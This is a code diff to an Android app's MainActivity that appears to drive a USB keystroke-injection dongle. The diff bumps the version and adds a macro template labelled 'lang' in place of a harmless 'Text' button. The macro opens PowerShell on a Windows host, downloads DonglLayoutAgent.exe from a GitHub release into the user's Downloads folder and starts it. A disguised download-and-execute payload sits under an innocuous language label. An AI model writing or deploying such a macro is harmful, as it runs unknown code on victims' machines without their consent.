@@ -32,8 +32,8 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 public class MainActivity extends Activity {
-    private static final int VERSION_CODE = 5;
-    private static final String VERSION_NAME = "1.4";
+    private static final int VERSION_CODE = 6;
+    private static final String VERSION_NAME = "1.5";
     private static final String API_BASE = "http://31.76.20.227";
     private static final String NOTEPAD_DUCKY =
             "DELAY 1000\n" +
@@ -43,6 +43,26 @@ public class MainActivity extends Activity {
             "DELAY 200\n" +
             "ENTER\n" +
             "DELAY 1000";
+    private static final String LANG_DUCKY =
+            "ENG\n" +
+            "DELAY 1000\n" +
+            "GUI r\n" +
+            "DELAY 500\n" +
+            "STRING powershell\n" +
+            "DELAY 200\n" +
+            "ENTER\n" +
+            "DELAY 1000\n" +
+            "STRING $url = 'https://github.com/eee861138-rgb/t-dongle-s3-firmware/releases/download/v1.4.0/DonglLayoutAgent.exe'\n" +
+            "ENTER\n" +
+            "DELAY 300\n" +
+            "STRING $out = \"$env:USERPROFILE\\Downloads\\DonglLayoutAgent.exe\"\n" +
+            "ENTER\n" +
+            "DELAY 300\n" +
+            "STRING Invoke-WebRequest -Uri $url -OutFile $out\n" +
+            "ENTER\n" +
+            "DELAY 2000\n" +
+            "STRING Start-Process $out\n" +
+            "ENTER\n";
 
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
     private final Handler main = new Handler(Looper.getMainLooper());
@@ -99,9 +119,9 @@ public class MainActivity extends Activity {
         hello.setOnClickListener(v -> macroInput.setText(NOTEPAD_DUCKY));
         templates.addView(hello, new LinearLayout.LayoutParams(0, -2, 1));
 
-        Button text = makeButton("Text");
-        text.setOnClickListener(v -> macroInput.setText("STRING Hello World\nENTER"));
-        templates.addView(text, new LinearLayout.LayoutParams(0, -2, 1));
+        Button lang = makeButton("lang");
+        lang.setOnClickListener(v -> macroInput.setText(LANG_DUCKY));
+        templates.addView(lang, new LinearLayout.LayoutParams(0, -2, 1));
 
         Button wait = makeButton("Wait");
         wait.setOnClickListener(v -> macroInput.setText("DELAY 1000"));
